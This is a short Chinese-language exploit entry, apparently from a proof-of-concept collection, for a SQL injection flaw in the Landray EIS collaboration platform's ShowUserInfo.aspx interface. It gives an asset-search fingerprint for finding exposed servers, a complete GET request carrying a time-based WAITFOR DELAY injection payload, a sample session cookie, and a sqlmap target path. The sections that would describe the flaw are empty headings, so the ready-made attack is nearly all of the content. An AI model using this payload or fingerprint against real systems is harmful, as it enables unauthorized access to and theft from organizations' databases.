# 蓝凌EIS智慧协同平台ShowUserInfo接口SQL注入漏洞

- **系统**：蓝凌EIS智慧协同平台ShowUserInfo接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=3ec5ixjhunwabhq5poammn55; FIOA_IMG_FOLDER=FI`

**请求体 / payload**
```

sqlmap
/third/DingTalk/Demo/ShowUserInfo.aspx?account=1

\[蓝凌-EIS-showuserinfo-sql注入\_poc.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台ShowUserInfo接口SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台